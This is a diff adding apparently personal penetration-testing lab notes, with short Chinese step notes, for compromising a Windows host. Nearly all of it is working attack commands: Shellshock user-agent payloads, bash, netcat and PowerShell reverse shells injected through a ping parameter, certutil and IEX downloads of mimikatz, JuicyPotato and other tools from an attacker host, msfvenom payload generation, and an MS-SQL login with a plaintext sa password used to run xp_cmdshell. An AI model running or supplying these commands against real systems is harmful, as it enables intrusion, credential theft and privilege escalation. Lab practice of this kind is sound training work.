@@ -1,0 +1,74 @@
+nmap -sV -sC -Pn 10.11.1.31 > nmap.txt
+gobuster dir  -u http://10.11.1.31/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,cgi > gobuster.txt
+
+
+
+curl -A "() { :;};echo; /bin/bash -i >& /dev/tcp/10.11.1.31 0>&1 " http://10.129.1.175/cgi-bin/user.sh
+curl -A "() { :;};echo; whoami " http://10.11.1.31/_vti_pingit/pingit.py
+
+RealmName:ralph
+smb無法上傳
+gobuster無法訪問
+無法bypass登入
+
+bash -i >& /dev/tcp/192.168.119.134/4444 0>&1
+
+192.168.119.134& /bin/sh -i >& /dev/tcp/192.168.119.134/80 0>&1
+192.168.119.134& nc -e /bin/sh 192.168.119.134 80
+192.168.119.134& nc -e /bin/bash 192.168.119.134 80
+192.168.119.134& "nc -c bash 192.168.119.134 80"
+192.168.119.134& powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.119.134",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+192.168.119.134& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.134',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.119.134",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+
+certutil.exe -urlcache -split -f http://192.168.119.134/shell.bat shell.bat
+certutil.exe -urlcache -split -f http://192.168.119.134/MSFRottenPotato.exe MSFRottenPotato.exe
+C:\timmy\MSFRottenPotato.exe * C:\timmy\shell.bat
+certutil.exe -urlcache -split -f http://192.168.119.134/Chimichurri.exe Chimichurri.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/winPEAS.exe winPEAS.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/mimikatz.exe mimikatz.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/nc64.exe nc64.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/JuicyPotato.exe JuicyPotato.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/shelljc.bat shelljc.bat
+certutil.exe -urlcache -split -f http://192.168.119.134/test_clsid.bat test_clsid.bat
+certutil.exe -urlcache -split -f http://192.168.119.134/CLSID.list CLSID.list
+certutil.exe -urlcache -split -f http://192.168.119.134/test_clsid.bat test_clsid.bat
+
+msfvenom -p cmd/windows/reverse_powershell lhost=192.168.119.134 lport=9999 > shellmsf.bat
+
+
+JuicyPotato.exe -t * -p shelljc.bat -l 444
+C:\SQLServer2017Media\JuicyPotato.exe -t t -p C:\Users\Public\whoami.exe -l 5837
+
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {3D14228D-FBE1-11d0-995D-00C04FD919C1}
+
+powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/Sherlock.ps1')
+powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/PowerUp.ps1')
+
+sqsh -S 10.11.1.31 -U sa -P poiuytrewq
+xp_cmdshell "powershell -c IEX(New-Object Net.Webclient).downloadstring('http://192.168.119.134/Invoke-PowerShellTcp.ps1')"
+
+PS C:\timmy> whoami /priv
+
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+
+1.nmap掃描發現80端口可以直接訪問,嘗試弱密碼及bypass無法登入
+2.smbclient發現wwwrooot路徑可讀不可寫,將所有檔案載下來,發現_vti_pingit有漏洞可利用
+3.嘗試 ; ' " ＆ 可斷開或是接續執行指令,＆可接續執行指令
+4.嘗試revershe shell cheat sheet,這台是windows，嘗試powershell指令,這條可以
+192.168.119.134& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.134',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+5.在smb裡面發現MS-SQL帳密,透過sqsh登入後取得reverse shell,參考tally
